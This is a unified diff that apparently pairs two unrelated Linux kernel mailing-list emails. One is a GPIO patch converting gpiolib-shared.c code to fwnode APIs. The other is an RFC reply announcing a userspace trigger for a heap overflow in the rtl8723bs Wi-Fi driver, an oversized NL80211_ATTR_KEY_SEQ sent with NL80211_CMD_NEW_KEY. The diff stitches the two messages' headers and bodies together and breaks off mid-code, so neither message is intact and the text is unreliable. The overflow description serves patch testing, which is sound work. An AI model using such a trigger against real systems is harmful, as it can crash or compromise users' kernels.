@@ -1,112 +1,60 @@
-Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=205.220.168.131
+Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.remote-ip=185.70.43.99
 ARC-Seal: i=1; d=subspace.kernel.org; s=arc20261015; a=rsa-sha256; cv=none;
-	t=1793801085;
-	b=ue33ZfE7naOBzjmQN7fWhN5kCsKVrPA5vzEZ8XhouoAK7g5edah0bG5qU7Tp4i0rCsCh
-	 1ZNms8qWuhHv/Dp7N2GUwUL+H9dNXkTwhNCjoblVkkZS4SOOsnol0o6/63zU0m9VFL5+k
-	 teIH3QsevNw+i0haFvYJUkFayFQdRvV4NyL5KrtOwptdCLLnNWD1qj1Ol6g5LJev6MSbY
-	 k9SOdfFgUrSCBJFwbRyKyyOCTIK5CSw4pqxK+LZ292s+aefQw3uayeaYZs0qHel5vshq8
-	 w+Pk0LEOw5ZVZDRosmrUaMTyCzZcoX1avUBCpqgE5tiVBicg2t9U+zmXRgRsGh+48CQ==
+	t=1793801103;
+	b=0m4ViUJ9FwJKnl60RjfuG4qYF36u6nYySKwNwXFip8g5iby9zeK0+Dg3MqIHdk8ZPKl/
+	 Lg9LzVvY6fGnGsE2dBKdpnf58hR6vnwyv3j4CVvDtRpYpJb8ewPOcq0k8/IJDv0tUdq0R
+	 9RubUKbbRtJM6JIeL0b8uZzLtohk9akt35fKViQ2PZndfRck6NwSwMX89Zk97nMcb0LP3
+	 PQYDOmex4zoa9/gBftKOiGbEiXSfnB92CF3S7TP91ojLIJF4VIYbnaBVqoRE8ylOvL3k/
+	 saeAuZmnaHrVI2tauxD362XklYWSkGDASL/OXN7S77iJxDNadGWvhsI0vbbrGi12iaQ==
 ARC-Message-Signature: i=1; d=subspace.kernel.org; s=arc20261015;
-	a=rsa-sha256; c=relaxed/relaxed; t=1793801085;
-	h=DMARC-Filter:Received:DKIM-Signature:Received:Received:
-	 DKIM-Signature:X-Google-DKIM-Signature:X-Forwarded-Encrypted:
-	 X-Gm-Message-State:X-Gm-Gg:X-Received:X-Received:Received:From:Date:
-	 Subject:MIME-Version:Content-Type:Content-Transfer-Encoding:
-	 Message-Id:References:In-Reply-To:To:Cc:X-Mailer:
-	 X-Developer-Signature:X-Developer-Key:X-Proofpoint-Spam-Details-Enc:
-	 X-Proofpoint-GUID:X-Proofpoint-ORIG-GUID:X-Proofpoint-Spam-Info:
-	 X-Authority-Analysis:X-Proofpoint-Virus-Version:
-	 X-Proofpoint-Spam-Details;
-	bh=CvpiuG2v7LqsgYioH9W2BL0A18x1i9O8dQ1j4rntT/0=;
-	b=o1UbQkkXsha44rNmPSYshT0MofgirSqsBGLNWr3l5rKCxZD6M7HXV0H5kIb6T5o/u4SN
-	 LseZngDWGTUWmX0NgZPjSq0/HpPCIueK+lGQbzsxEk7UqfL3XMDRae/K6CGA8chu3aoLI
-	 wGCY73NwxBizGR1bTwwZ3y1bxPsI5V1qYO6DVTfDdNYMxHRlReIPPlq9ok6PcS3JUPWJB
-	 RaD3BpIX4vHzaiegburMZtt/23deq6yKTbD0ar/StmTpofg1GXVhiPTvcReCCqeWtpFgP
-	 UY2zNxKlWJS7pH9++qaB1ZizNkW5TMXhcIxvWI5hHuF5pUC24jwrjEZZ6dG8G+QsTlA==
+	a=rsa-sha256; c=relaxed/relaxed; t=1793801103;
+	h=DMARC-Filter:DKIM-Signature:Date:To:From:Cc:Subject:Message-ID:
+	 In-Reply-To:References:Feedback-ID:X-Pm-Message-ID:MIME-Version:
+	 Content-Type:Content-Transfer-Encoding;
+	bh=MAf+viOPyh2JY6q4/ySV6UPyFroTwgoq4MbJIwePkeU=;
+	b=WajfWK9ltp0HciTlhJ+fqcrQBZC3Kmz80IMOj9WgPYQQfMX+EW8umJ1C+AjY/3yK3rGA
+	 InRw2m6SMwk8keHtSdN4cad91FaMoxYSBvqFvI4PP/ISS7nrp0dM1HLyExvgKzPDdnmVN
+	 u4iQiQCDdCHSs1MQE738j9sTjHTNPlMoZ6Uklx/2Ak2rBZLqRkWJzMQBcJsXnltLLxW48
+	 kH6n5FuDiiEyVsQso7jZ5VgR2c/KElx4O0GT+9qEuOX2tVL85oI2AlT3aWi2t2wzDrn1O
+	 4H7UK5x+2mfWMSKHNsuFHglBdD/IufsrrwRMTdtHblnw2SJvdtfQ7I3LgQmUUG9Kr7g==
 ARC-Authentication-Results: i=1; smtp.subspace.kernel.org; 
-	dmarc=pass header.from=oss.qualcomm.com;
-	spf=pass smtp.mailfrom=oss.qualcomm.com;
-	dkim=pass header.d=qualcomm.com header.i=@qualcomm.com header.a=rsa-sha256 header.s=qcppdkim1 header.b=c5t4RPmy;
-	dkim=pass header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.a=rsa-sha256 header.s=google header.b=ezWqZaom;
-	arc=none smtp.remote-ip=205.220.168.131
-Received: from mx0a-0031df01.pphosted.com (mx0a-0031df01.pphosted.com [205.220.168.131])
+	dmarc=pass header.from=innora.ai;
+	spf=pass smtp.mailfrom=innora.ai;
+	dkim=pass header.d=innora.ai header.i=@innora.ai header.a=rsa-sha256 header.s=protonmail3 header.b=ZUE8W9w1;
+	arc=none smtp.remote-ip=185.70.43.99
+Received: from mail-4399.protonmail.ch (mail-4399.protonmail.ch [185.70.43.99])
 	(using TLSv1.3 with cipher TLS_AES_256_GCM_SHA384 (256/256 bits)
 	 key-exchange X25519 server-signature ECDSA (prime256v1) server-digest SHA256)
 	(No client certificate requested)
-	by smtp.subspace.kernel.org (Postfix) with ESMTPS id A10FC606D812
-	for <linux-kernel@vger.kernel.org>; Wed,  4 Nov 2026 14:04:44 +0000 (UTC)
-DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org A10FC606D812
-Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=none dis=none) header.from=oss.qualcomm.com
-Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=oss.qualcomm.com
+	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 8CC51606A333;
+	Wed,  4 Nov 2026 14:04:59 +0000 (UTC)
+DMARC-Filter: OpenDMARC Filter v1.4.2 smtp.subspace.kernel.org 8CC51606A333
+Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=reject dis=none) header.from=innora.ai
+Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=innora.ai
 Authentication-Results: smtp.subspace.kernel.org;
-	dkim=pass (2048-bit key, unprotected) header.d=qualcomm.com header.i=@qualcomm.com header.a=rsa-sha256 header.s=qcppdkim1 header.b=c5t4RPmy;
-	dkim=pass (2048-bit key, unprotected) header.d=oss.qualcomm.com header.i=@oss.qualcomm.com header.a=rsa-sha256 header.s=google header.b=ezWqZaom
-Received: from pps.filterd (m0279867.ppops.net [127.0.0.1])
-	by mx0a-0031df01.pphosted.com (8.18.1.11/8.18.1.11) with ESMTP id 6A4BZsZt2667761
-	for <linux-kernel@vger.kernel.org>; Wed, 4 Nov 2026 14:04:44 GMT
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=qualcomm.com; h=
-	cc:content-transfer-encoding:content-type:date:from:in-reply-to
-	:message-id:mime-version:references:subject:to; s=qcppdkim1; bh=
-	CvpiuG2v7LqsgYioH9W2BL0A18x1i9O8dQ1j4rntT/0=; b=c5t4RPmysFcyTYBU
-	gl3xLV5rm95mUnO2g888eol71FJq/lJnSkg+q27jKn6y1IrIH5wJ1XcVx+Ved10L
-	VPr+KnEzZI/Zr0xU/Q3GzaWj2N7jM3HzhXoGWcg6XsPvsjFn/mHrYVJiR2tccSy1
-	9jdXY7BHNogQPf6oFPXcMOReKGsUOlrnLVGgFhEeVHCtznJOJAcBNMR97EV51Dpf
-	OBf/ZpgNdweXsCyXC+xxL2WT0lky8qI6cLbpmGeP3Jpv3M5iJAbTk3K4MhQJ/sZZ
-	v9WPQRCZ3rYHYjv/2spmuT0H5P+XQSN3ic9Q1iZMTUBHqRiN97H/eoRZDeGOXP4s
-	kLzJcA==
-Received: from mail-vk1-f200.google.com (mail-vk1-f200.google.com [209.85.221.200])
-	by mx0a-0031df01.pphosted.com (PPS) with ESMTPS id 4hqm2pmegr-1
-	(version=TLSv1.3 cipher=TLS_AES_128_GCM_SHA256 bits=128 verify=NOT)
-	for <linux-kernel@vger.kernel.org>; Wed, 04 Nov 2026 14:04:43 +0000 (GMT)
-Received: by mail-vk1-f200.google.com with SMTP id 71dfb90a1353d-5eaad8219b0so52603e0c.3
-        for <linux-kernel@vger.kernel.org>; Wed, 04 Nov 2026 06:04:43 -0800 (PST)
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=oss.qualcomm.com; s=google; t=1793801083; x=1794405883; darn=vger.kernel.org;
-        h=cc:to:in-reply-to:references:message-id:content-transfer-encoding
-         :content-type:mime-version:subject:date:from:from:to:cc:subject:date
-         :message-id:reply-to:content-type;
-        bh=CvpiuG2v7LqsgYioH9W2BL0A18x1i9O8dQ1j4rntT/0=;
-        b=ezWqZaomCipUIxZRKXnpY8uhf7IjnJFuEIOYxYzRoAEYHYeDhZA4buWShJCDhDojF5
-         0Fg0KOER+KVzb8kPWH5bzhC3tqvjLqHNGCCdnulD8YZi/R2TDv19977Pp6rda9gyJF2t
-         +FsOIvBNjLN1IlXMd/hqzl52Kn+67Q7c+kSmhPKlCnaKLW3BKz+Qly3oFbVgp4SUcAfe
-         v5s04n1TpQErTFmLmJyxCwh+AI98kClCkkHjtP7kLilaRZ2kK7/sp75DHpuqmkdjaJqe
-         qOjqM2TZ5pkROtqiUS1ujOHnhGas/6v6NZzIKXZ4jSgc00Xx9ZckJe7Yu3+QfHgxqQpW
-         KjHQ==
-X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
-        d=1e100.net; s=20260707; t=1793801083; x=1794405883;
-        h=cc:to:in-reply-to:references:message-id:content-transfer-encoding
-         :content-type:mime-version:subject:date:from:x-gm-gg
-         :x-gm-message-state:from:to:cc:subject:date:message-id:reply-to
-         :content-type;
-        bh=CvpiuG2v7LqsgYioH9W2BL0A18x1i9O8dQ1j4rntT/0=;
-        b=glzTVC6EE8JZBJSdA+Z656sfM95P+ZL/ZMhb2ZRfFa8LqT6Q1XfzygwlklGCiCMvX8
-         hPNAieLP70dYkMvpfohqh6Vq3Bwn2rGMmA2wh0Jc8yRdH8dUaipwfN/yBhNRqhPtmNxl
-         1kTIwBg6MWvqXN5yq3WlpqEC0qaEdIEQ31VNTDVtnxv5mz2V6b7Og/OnYDhbQVsGh7R7
-         oLBexz7Q2owT9LPuHqZIutM/VVmNNLZW/Cc66rltoDeNb4b67C/nCCMw4yGGhKqks6HC
-         xjPeAA+3Hdy1Tg8P5dNSvqvPA4g3eRSEHZQwQcsllsWdKCfAgRVTnUn0x6dQcgnXanHU
-         72Rw==
-X-Forwarded-Encrypted: i=1; AKwUvByfPsDBzNgetiW3HWQbnn5Mj3hkhZjQcIyIM6zHEJr7nJMM0ODuAjSCkicPMuRLiK0tgS4PxrJIFDsOvsI=@vger.kernel.org
-X-Gm-Message-State: APuU4Z+QMalUAvSa4QTZjqkKGUnfsFgXIriqqJ28gaBHAsyxvYnVQ8Q8
-	2v1Pep56/dA7Ct++gsfiQ7+T8/bAewuyGZJ/w2SDpngTND3A0/fyxcmOAetti7JCI93ZUoOWP8Z
-	RgXjQ2Ia9mWdpzwnOsEDZVH+UBZK7eGbqkysMDZM0EGEPUeIv6Zs9KqfxNlh3u4WOojw=
-X-Gm-Gg: AYBFou14miSt9Q6qdXFpOEVZUFpLIv1S4NDOyEuuIffdQSJHPqzmOlH/jg5dI1WrON6
-	YBHlEVjMUWpdRDHnPqdWxnbGP9lkwwBgnTllLOg/D+AOO+0l/EOeEhOpLiuP7lIU3jzIS86wOnY
-	ho7G74aG8Izkc2vyU3r5CTjm6oeTQAOHPYQNU9FGAKGZrI/fWAFsi2Asmo4DDgEHFNO954HGjdX
-	UpmbPoDeTyhO1W6y7+66Zm4JetoYWXqB3lp7vsFk75b5UZPz33SSOHoWQq/YOmPhWj4R6fpnqLX
-	wDKhaDN714dIXnRI4bg+WXwvrU2ztoUENhhuTbANazAh7YEdtcNGhmz4p92G2H8DRx6PRFm2+Nb
-	17HwMqxiwEeNIwPnwp6xbtvWfDZ94NtTldWn6OVzC8dESw9dH/OJU2p/09CnbuyYbM+2SO4w/w4
-	R/Kg==
-X-Received: by 2002:a05:6122:3c54:b0:5ea:c11b:432c with SMTP id 71dfb90a1353d-5ec68971961mr7027630e0c.15.1793801082517;
-        Wed, 04 Nov 2026 06:04:42 -0800 (PST)
-X-Received: by 2002:a05:6122:3c54:b0:5ea:c11b:432c with SMTP id 71dfb90a1353d-5ec68971961mr7027502e0c.15.1793801081438;
-        Wed, 04 Nov 2026 06:04:41 -0800 (PST)
-Received: from brgl-qcom.local ([2a01:cb1d:dc:7e00:8916:7b9b:97a2:6c96])
-        by smtp.gmail.com with ESMTPSA id ffacd0b85a97d-48fec8d87b5sm3968358f8f.11.2026.11.04.06.04.37
-        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
-        Wed, 04 Nov 2026 06:04:39 -0800 (PST)
-From: Bartosz Golaszewski <bartosz.golaszewski@oss.qualcomm.com>
-Date: Wed, 04 Nov 2026 15:03:51 +0100
-Subject: [PATCH 9/9] gpio: shared: generalize most code to firmware nodes
+	dkim=pass (2048-bit key, unprotected) header.d=innora.ai header.i=@innora.ai header.a=rsa-sha256 header.s=protonmail3 header.b=ZUE8W9w1
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=innora.ai;
+	s=protonmail3; t=1793801096; x=1794060296;
+	bh=MAf+viOPyh2JY6q4/ySV6UPyFroTwgoq4MbJIwePkeU=;
+	h=Date:To:From:Cc:Subject:Message-ID:In-Reply-To:References:
+	 Feedback-ID:From:To:Cc:Date:Subject:Reply-To:Feedback-ID:
+	 Message-ID:BIMI-Selector;
+	b=ZUE8W9w1ZW0t76mfKHFrM6uwG6egPoDuPvHiV5Tf1+qTy4slP24Dlww+EQnrK0E+1
+	 GaMUZ1N0C8n9pMazgN7HLXk1H8hpOUI//CTatvFesy+W1cTp5gS60uoUKqL4FphTB6
+	 x/hodMv8V4JcLMsY6V+MSZsrnsgg3KqrT41KCjtwbk1axUTux8Ucre/4vgFbN0vMCT
+	 gBUgmNbCidITKDgaCyA7/F8cdjcVjRiUYYwQ0uIYsjb51pSNCLcfC7ANDQzme48sIe
+	 NFNvap26A7G8h+fy+OjTiaaqc+9f/d3/s57hae8+VnHv22DLaG3uyGd6tjgKh4paR6
+	 l6dlRmBGySvlA==
+Date: Wed, 04 Nov 2026 14:04:50 +0000
+To: gregkh@linuxfoundation.org
+From: Feng Ning <feng@innora.ai>
+Cc: linux-staging@lists.linux.dev, linux-wireless@vger.kernel.org, luka.gejak@linux.dev, linux-kernel@vger.kernel.org, stable@vger.kernel.org, Feng Ning <feng@innora.ai>
+Subject: Re: [RFC PATCH v7] staging: rtl8723bs: fix heap buffer overflow in cfg80211_rtw_add_key()
+Message-ID: <20261104220434.677da673-2-feng@innora.ai>
+In-Reply-To: <20261104220347.ccc09fa4-1-feng@innora.ai>
+References: <20260413113224.5201-1-feng@innora.ai> <2026042626-tabloid-suitor-33c5@gregkh> <20260427111738.33069-1-feng@innora.ai> <2026050417-monkhood-backless-4c3e@gregkh> <20260504154823.52057-1-feng@innora.ai> <2026050458-numbness-haven-1ae4@gregkh> <20261104220347.ccc09fa4-1-feng@innora.ai>
+Feedback-ID: 140578448:user:proton
+X-Pm-Message-ID: 4cf252529bc12bbb696741956dbf03401e3d81c8
 X-Mailing-List: linux-kernel@vger.kernel.org
 List-Id: <linux-kernel.vger.kernel.org>
 List-Post: <mailto:linux-kernel@vger.kernel.org>
@@ -116,415 +64,173 @@ List-Unsubscribe: <mailto:linux-kernel+unsubscribe@vger.kernel.org>
 List-Owner: <mailto:linux-kernel+owner@vger.kernel.org>
 Precedence: list
 MIME-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
-Content-Transfer-Encoding: 7bit
-Message-Id: <20261104-fwnode-for-each-prop-v1-9-6e28fe1c72c4@oss.qualcomm.com>
-References: <20261104-fwnode-for-each-prop-v1-0-6e28fe1c72c4@oss.qualcomm.com>
-In-Reply-To: <20261104-fwnode-for-each-prop-v1-0-6e28fe1c72c4@oss.qualcomm.com>
-To: Andy Shevchenko <andriy.shevchenko@linux.intel.com>,
-        Daniel Scally <djrscally@gmail.com>,
-        Heikki Krogerus <heikki.krogerus@linux.intel.com>,
-        Sakari Ailus <sakari.ailus@linux.intel.com>,
-        Bartosz Golaszewski <brgl@kernel.org>,
-        Greg Kroah-Hartman <gregkh@linuxfoundation.org>,
-        "Rafael J. Wysocki" <rafael@kernel.org>,
-        Danilo Krummrich <dakr@kernel.org>, Johan Hovold <johan@kernel.org>,
-        Hans Verkuil <hverkuil@kernel.org>,
-        Laurent Pinchart <laurent.pinchart@ideasonboard.com>,
-        Kees Cook <kees@kernel.org>, Andy Shevchenko <andy@kernel.org>,
-        Len Brown <lenb@kernel.org>, Rob Herring <robh@kernel.org>,
-        Saravana Kannan <saravanak@kernel.org>,
-        Linus Walleij <linusw@kernel.org>
-Cc: linux-acpi@vger.kernel.org, driver-core@lists.linux.dev,
-        linux-kernel@vger.kernel.org, linux-hardening@vger.kernel.org,
-        devicetree@vger.kernel.org, linux-gpio@vger.kernel.org,
-        Bartosz Golaszewski <bartosz.golaszewski@oss.qualcomm.com>
-X-Mailer: b4 0.14.2
-X-Developer-Signature: v=1; a=openpgp-sha256; l=10683;
- i=bartosz.golaszewski@oss.qualcomm.com; h=from:subject:message-id;
- bh=WAePSYcqwmx9zFDVEtTkMdht35rLwyfSp8xtwHJeP9A=;
- b=owEBbQKS/ZANAwAKAQWdLsv/NoTDAcsmYgBq6ztTe/ygpY5Gk49WKX0BfmDIFYf0/pLuvhnEn
- bpip+H0OCKJAjMEAAEKAB0WIQSR5RMt5bVGHXuiZfwFnS7L/zaEwwUCaus7UwAKCRAFnS7L/zaE
- w1d2EACOyKpj5dhBJMlbVVapisSgNcGsb4M7PItzp/Lx9O7KynE4un8oyXXsZBuFyLWSC8lP+yV
- I/tysH+DWRbKEmIuMgCxjZVRWURerYG5oPKtmlnal2D6JF+exsSkm0++B+wu1SLMlicRS0oaAta
- MIMd0krCpM3V3DV1ucIE/hQ8QgV48uKx3dfJQ+/byirds98knrhqFq5wUeNyvLzyPF21TuGAyYv
- JKtPh+Mv+aZfPc7pp93EurC0VA7C2ziPqPdBl5rjrX8rHS+wWTnKravvLXsHEPvmvsYuFnr6Zwn
- zD7OK07UB+gXKSRqQO8te1pnQsYg9ny20ozpzdGUSvw2nBFlDz8oBW3OSLAxxcJhYAlBwfKT2QV
- LSqpbHtxmU8t5atIp55nrLV4O+jF+cLB+zydST+v5xsMAQ3qfVTVhFVkNPQbd2UCoOd6/DdEW00
- iTOiPgQuYoWtWcYnev5tmQwZfpuKP0hWYBcNecvfAM/xqV6XfC/yLx4JX6tTxvJNHhO23tvfmw6
- +U4F9ofABssgmBf5L8q1AbcGkKG+/kxgs11ZNY1AyW3gSYJqxHIFpPLP0gMRF3T20O6aG2P5yPp
- 7lPrjHWWLmHw9FkEGzmMwB6clhkpiKyfcwTtMzfZ0tFpb+bw34caFXqYMrXS7wBY4NthrPvUB0Y
- RUEyG2TYSTqRmmw==
-X-Developer-Key: i=bartosz.golaszewski@oss.qualcomm.com; a=openpgp;
- fpr=169DEB6C0BC3C46013D2C79F11A72EA01471D772
-X-Proofpoint-Spam-Details-Enc: AW1haW4tMjYxMTA0MDA1NSBTYWx0ZWRfX7Ot5KnjKv4uu
- CSdONHhXsXgzzu2/6B97UzDN9N6NvKZen7SWFsgFc0KBWDAlNFUK0B/z8uiJeCcsj+8JhB0J9LT
- Np328rVs96zvbiUa23qySI5M/QbzNMzPNEmy1tYgBpBtn+lbvhIUJ6iushaQNM4vfM6lesxH5M8
- 3UDDoxiVI6VZvB/3NxOL/VmMEtyv//Qd/O9IYM8+IhaE4dK8jTQ1wktfqRBjfmmXRLAu9F7qib9
- J7Ap/Bny3eexwu5QxjQs16V0sD4OZF/5w656zW0uCjkVSISdFrQIHfwjbURsX9kBzhNMCve6M/u
- lVI2eMt67lG5M0E5kz7P1VAV5QHmmc1gvmcgjHeBggqB1kAr3NvQZ5KcM6gMSfbsKnoH/shJ5b/
- FWraVnagr6F7S8v7F98DWh6EZPT1bo9qI6Pg4SNJff1Vv8x8/Nig2W0ySqr66h89bmIkeSWnkQe
- Fm5TdHKh+YOeAiSyjyQ==
-X-Proofpoint-GUID: 3WA7EE24XCEbvOJR235Rsmk9fUK0CSsm
-X-Proofpoint-ORIG-GUID: 3WA7EE24XCEbvOJR235Rsmk9fUK0CSsm
-X-Proofpoint-Spam-Info: AW1haW4tMjYxMTA0MDA1NSBTYWx0ZWRfX/3Y9kLL2yh4l
- YIiDm9/q43A14CfX7ce6OOhSss7RwYMwUlrpHIINCeOeUnjLcm/f1ceBfCSX9qz+zThxr3FAgo3
- XPfChyYAZboob+yFrkHRcZynaqOqzBE=
-X-Authority-Analysis: v=2.4 cv=c64+0h9l c=1 sm=1 tr=0 ts=6aeb3b7b cx=c_pps
- a=wuOIiItHwq1biOnFUQQHKA==:117 a=xqWC_Br6kY4A:10 a=IkcTkHD0fZMA:10
- a=zJRp6_cAMcgA:10 a=s4-Qcg_JpJYA:10 a=VkNPw1HP01LnGYTKEx00:22
- a=u7WPNUs3qKkmUXheDGA7:22 a=eoimf2acIAo5FJnRuUoq:22 a=EUspDBNiAAAA:8
- a=ziVQ5hnd3nnfPSIR4FkA:9 a=QEXdDO2ut3YA:10 a=XD7yVLdPMpWraOa8Un9W:22
-X-Proofpoint-Virus-Version: vendor=baseguard
- engine=ICAP:2.0.293,Aquarius:18.0.1176,Hydra:6.1.138,FMLib:17.12.100.49
- definitions=2026-11-04_04,2026-11-03_04,2025-10-01_01
-X-Proofpoint-Spam-Details: rule=outbound_notspam policy=outbound score=0
- impostorscore=0 spamscore=0 adultscore=0 malwarescore=0 bulkscore=0
- lowpriorityscore=0 phishscore=0 suspectscore=0 clxscore=1015
- priorityscore=1501 classifier=typeunknown authscore=0 authtc= authcc=
- route=outbound adjust=0 reason=mlx scancount=1 engine=8.22.0-2610300000
- definitions=main-2611040055
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
 
-Ahead of adding support for sharing of GPIOs for other types of firmware
-nodes, convert as much code in gpiolib-shared.c as possible to using
-fwnode APIs and guard the remaining OF-specific bits with CONFIG_OF
-guards.
+As mentioned in the RFC, here is the userspace trigger for the
+overflow, for anyone with rtl8723bs hardware willing to test.
 
-Signed-off-by: Bartosz Golaszewski <bartosz.golaszewski@oss.qualcomm.com>
----
- drivers/gpio/gpiolib-shared.c | 241 +++++++++++++++++++++++-------------------
- 1 file changed, 131 insertions(+), 110 deletions(-)
+It sends NL80211_CMD_NEW_KEY with a 16-byte NL80211_ATTR_KEY_SEQ
+(8 bytes more than ieee_param.crypt.seq holds) on a monitor-less
+managed interface.  On an unpatched kernel with KASAN enabled it
+should produce:
 
-diff --git a/drivers/gpio/gpiolib-shared.c b/drivers/gpio/gpiolib-shared.c
-index 8c9ac9d9330490b17fb3936b8758beb97a308a15..58ac049bb603e2946c81e67a047b4788d39213b4 100644
---- a/drivers/gpio/gpiolib-shared.c
-+++ b/drivers/gpio/gpiolib-shared.c
-@@ -23,6 +23,7 @@
- #include <linux/property.h>
- #include <linux/slab.h>
- #include <linux/string.h>
-+#include <linux/string_helpers.h>
- 
- #include "gpiolib.h"
- #include "gpiolib-shared.h"
-@@ -63,7 +64,7 @@ struct gpio_shared_entry {
- static LIST_HEAD(gpio_shared_list);
- static DEFINE_IDA(gpio_shared_ida);
- 
--#if IS_ENABLED(CONFIG_OF)
-+
- static struct gpio_shared_entry *
- gpio_shared_find_entry(struct fwnode_handle *controller_node,
- 		       unsigned int offset)
-@@ -133,158 +134,162 @@ static int gpio_shared_setup_reset_proxy(struct gpio_shared_entry *entry,
- }
- 
- /* Handle all special nodes that we should ignore. */
--static bool gpio_shared_of_node_ignore(struct device_node *node)
-+static bool gpio_shared_fwnode_ignore(struct fwnode_handle *fwnode)
- {
- 	/* Ignore disabled devices. */
--	if (!of_device_is_available(node))
-+	if (!fwnode_device_is_available(fwnode))
- 		return true;
- 
- 	/*
--	 * __symbols__ is a special, internal node and should not be considered
--	 * when scanning for shared GPIOs.
-+	 * On OF-systems __symbols__ is a special, internal node and should not
-+	 * be considered when scanning for shared GPIOs.
- 	 */
--	if (of_node_name_eq(node, "__symbols__"))
-+	if (fwnode_name_eq(fwnode, "__symbols__"))
- 		return true;
- 
- 	/*
- 	 * GPIO hogs have a "gpios" property which is not a phandle and can't
- 	 * possibly refer to a shared GPIO.
- 	 */
--	if (of_property_present(node, "gpio-hog"))
-+	if (fwnode_property_present(fwnode, "gpio-hog"))
- 		return true;
- 
- 	return false;
- }
- 
--static int gpio_shared_of_traverse(struct device_node *curr)
-+static int gpio_shared_fwnode_scan_property(struct fwnode_handle *curr,
-+					    const char *propname)
- {
-+	struct fwnode_reference_args args;
- 	struct gpio_shared_entry *entry;
- 	size_t con_id_len, suffix_len;
- 	struct fwnode_handle *fwnode;
--	struct of_phandle_args args;
- 	struct gpio_shared_ref *ref;
--	struct property *prop;
- 	unsigned int offset;
- 	const char *suffix;
--	int ret, count, i;
-+	int ret, i, count;
- 
--	if (gpio_shared_of_node_ignore(curr))
-+	/*
-+	 * The standard name for a GPIO property is "foo-gpios"
-+	 * or "foo-gpio". Some bindings also use "gpios" or "gpio".
-+	 * There are some legacy device-trees which have a different
-+	 * naming convention and for which we have rename quirks in
-+	 * place in gpiolib-of.c. I don't think any of them require
-+	 * support for shared GPIOs so for now let's just ignore
-+	 * them. We can always just export the quirk list and
-+	 * iterate over it here.
-+	 */
-+	if (!strends(propname, "-gpios") && !strends(propname, "-gpio") &&
-+	    strcmp(propname, "gpios") != 0 && strcmp(propname, "gpio") != 0)
- 		return 0;
- 
--	for_each_property_of_node(curr, prop) {
--		/*
--		 * The standard name for a GPIO property is "foo-gpios"
--		 * or "foo-gpio". Some bindings also use "gpios" or "gpio".
--		 * There are some legacy device-trees which have a different
--		 * naming convention and for which we have rename quirks in
--		 * place in gpiolib-of.c. I don't think any of them require
--		 * support for shared GPIOs so for now let's just ignore
--		 * them. We can always just export the quirk list and
--		 * iterate over it here.
--		 */
--		if (!strends(prop->name, "-gpios") &&
--		    !strends(prop->name, "-gpio") &&
--		    strcmp(prop->name, "gpios") != 0 &&
--		    strcmp(prop->name, "gpio") != 0)
--			continue;
--
--		count = of_count_phandle_with_args(curr, prop->name,
--						   "#gpio-cells");
--		if (count <= 0)
--			continue;
-+	count = fwnode_property_count_references(curr, propname, "#gpio-cells");
-+	if (count <= 0)
-+		return 0;
- 
--		for (i = 0; i < count; i++) {
--			struct device_node *np __free(device_node) = NULL;
--			char *con_id __free(kfree) = NULL;
-+	for (i = 0; i < count; i++) {
-+		struct fwnode_handle *ctrl __free(fwnode_handle) = NULL;
-+		char *con_id __free(kfree) = NULL;
- 
--			ret = of_parse_phandle_with_args(curr, prop->name,
--							 "#gpio-cells", i,
-+		ret = fwnode_property_get_reference_args(curr, propname,
-+							 "#gpio-cells", 0, i,
- 							 &args);
--			if (ret)
--				continue;
-+		if (ret)
-+			continue;
- 
--			np = args.np;
-+		ctrl = args.fwnode;
- 
--			if (!of_property_present(np, "gpio-controller"))
--				continue;
-+		if (!fwnode_property_present(ctrl, "gpio-controller"))
-+			continue;
- 
--			/*
--			 * We support 1, 2 and 3 cell GPIO bindings in the
--			 * kernel currently. There's only one old MIPS dts that
--			 * has a one-cell binding but there's no associated
--			 * consumer so it may as well be an error. There don't
--			 * seem to be any 3-cell users of non-exclusive GPIOs,
--			 * so we can skip this as well. Let's occupy ourselves
--			 * with the predominant 2-cell binding with the first
--			 * cell indicating the hardware offset of the GPIO and
--			 * the second defining the GPIO flags of the request.
--			 */
--			if (args.args_count != 2)
--				continue;
-+		/*
-+		 * We support 1, 2 and 3 cell GPIO bindings in the
-+		 * kernel currently. There's only one old MIPS dts that
-+		 * has a one-cell binding but there's no associated
-+		 * consumer so it may as well be an error. There don't
-+		 * seem to be any 3-cell users of non-exclusive GPIOs,
-+		 * so we can skip this as well. Let's occupy ourselves
-+		 * with the predominant 2-cell binding with the first
-+		 * cell indicating the hardware offset of the GPIO and
-+		 * the second defining the GPIO flags of the request.
-+		 */
-+		if (args.nargs != 2)
-+			continue;
- 
--			fwnode = of_fwnode_handle(args.np);
--			offset = args.args[0];
-+		fwnode = ctrl;
-+		offset = args.args[0];
- 
--			entry = gpio_shared_find_entry(fwnode, offset);
--			if (!entry) {
--				entry = kzalloc_obj(*entry);
--				if (!entry)
--					return -ENOMEM;
-+		entry = gpio_shared_find_entry(fwnode, offset);
-+		if (!entry) {
-+			entry = kzalloc_obj(*entry);
-+			if (!entry)
-+				return -ENOMEM;
- 
--				entry->fwnode = fwnode_handle_get(fwnode);
--				entry->offset = offset;
--				entry->index = count;
--				INIT_LIST_HEAD(&entry->refs);
--				mutex_init(&entry->lock);
-+			entry->fwnode = fwnode_handle_get(fwnode);
-+			entry->offset = offset;
-+			entry->index = count;
-+			INIT_LIST_HEAD(&entry->refs);
-+			mutex_init(&entry->lock);
- 
--				list_add_tail(&entry->list, &gpio_shared_list);
--			}
-+			list_add_tail(&entry->list, &gpio_shared_list);
-+		}
- 
--			if (strends(prop->name, "gpios"))
--				suffix = "-gpios";
--			else if (strends(prop->name, "gpio"))
--				suffix = "-gpio";
--			else
--				suffix = NULL;
